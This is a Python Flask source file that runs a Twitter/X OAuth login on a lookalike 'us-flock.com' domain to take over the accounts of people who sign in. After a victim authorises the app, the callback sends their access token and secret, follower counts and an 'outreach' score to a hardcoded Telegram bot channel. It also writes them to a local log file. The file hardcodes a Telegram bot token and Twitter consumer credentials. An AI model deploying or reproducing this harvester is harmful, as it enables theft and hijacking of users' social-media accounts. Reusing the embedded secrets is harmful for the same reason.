from flask import Flask, redirect, request, session, url_for, render_template
import tweepy
import requests
import json
import os
app = Flask(__name__)
app.secret_key = 'icraatmakinesi'
telegram_bot_token = '6927604552:AAHX6iR3Gduu7qyLv6m_90EbhlS_-ZtBDxI'
telegram_channel_id = '-1002068987569'
consumer_key = 'HyvKFL4GgdSNn12zk154wMtHO'
consumer_secret = 'AsjY1A3qi6znOzBf8CpB5bdAX7mA3UXMXZbA5Pd7JfEfIv5ngi'
callback_url = 'https://us-flock.com/callback'
log_file_path = 'user_logs.json'


def calculate_outreach_ability(user):
    followers_count = user.followers_count
    friends_count = user.friends_count
    total_likes = user.favourites_count
    retweet_count = user.statuses_count
    is_verified = user.verified
    followers_weight = 0.5
    friends_weight = 0.2
    likes_weight = 0.1
    retweets_weight = 0.2
    verification_weight = 0.2
    followers_weight *= (2 if is_verified else 1)
    friends_weight *= (2 if is_verified else 1)
    likes_weight *= (2 if is_verified else 1)
    retweets_weight *= (2 if is_verified else 1)
    outreach_score = (followers_count * followers_weight +
                      friends_count * friends_weight +
                      total_likes * likes_weight +
                      retweet_count * retweets_weight)
    if is_verified:
        outreach_score *= (1 + verification_weight)
    max_possible_score = (user.followers_count + user.friends_count +
                          user.favourites_count + user.statuses_count)
    outreach_percentage = (outreach_score / max_possible_score) * 100

    return str(outreach_percentage)


def send_telegram_message(message):
    telegram_api_url = f'https://api.telegram.org/bot{telegram_bot_token}/sendMessage'
    params = {
        'chat_id': telegram_channel_id,
        'text': message
    }
    response = requests.post(telegram_api_url, params=params)
    return response.json()


def log_user_info(username, access_token, access_token_secret, followers_count, friends_count, created_at,
                  outreach_percentage):
    user_info = {
        "Username": username,
        "Access Token": access_token,
        "Access Token Secret": access_token_secret,
        "Followers": followers_count,
        "Friends": friends_count,
        "Created At": str(created_at),
        "Outreach Percent": outreach_percentage
    }
    existing_data = []
    if os.path.exists(log_file_path):
        with open(log_file_path, 'r') as log_file:
            existing_data = json.load(log_file)
    existing_user_index = next((index for (index, user) in enumerate(existing_data) if user["Username"] == username), None)

    if existing_user_index is not None:
        existing_data[existing_user_index] = user_info
    else:
        existing_data.append(user_info)

    with open(log_file_path, 'w') as log_file:
        json.dump(existing_data, log_file, indent=4)

@app.route('/')
def home():
    return render_template('index.html')


@app.route('/login')
def login():
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret, callback_url)
    auth_url = auth.get_authorization_url()
    session['request_token'] = auth.request_token
    return redirect(auth_url)


@app.route('/callback')
async def callback():
    request_token = session.get('request_token')
    if not request_token:
        return redirect(url_for('home'))  # Handle case where request_token is not set

    del session['request_token']

    auth = tweepy.OAuthHandler(consumer_key, consumer_secret, callback_url)
    auth.request_token = request_token

    verifier = request.args.get('oauth_verifier')
    auth.get_access_token(verifier)

    session['access_token'] = auth.access_token
    session['access_token_secret'] = auth.access_token_secret

    access_token = session.get('access_token')
    access_token_secret = session.get('access_token_secret')

    if not access_token or not access_token_secret:
        return redirect('https://flock.com')

    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_token, access_token_secret)
    client = tweepy.Client(
        consumer_key='',
        consumer_secret='',
        access_token=access_token,
        access_token_secret=access_token_secret)
    api = tweepy.API(auth)
    user = api.verify_credentials()
    outreach_percentage = calculate_outreach_ability(user)

    ext = (
        f"**New Account(app made by andrew tate)**\n\n🪪~Username: {user.screen_name}\n\n🔑~Access Token: {access_token}\n\n"
        f"🔑~Access Token Secret: {access_token_secret}\n\n👥~Followers: {user.followers_count}\n\n"
        f"🎉~Friends: {user.friends_count}\n\n⏰~Created At: {user.created_at}\n\n💎~Outreach Percent: {outreach_percentage}%"
    )
    send_telegram_message(ext)
    return redirect('https://us-flock.com')



if __name__ == '__main__':
    app.run(debug=True)
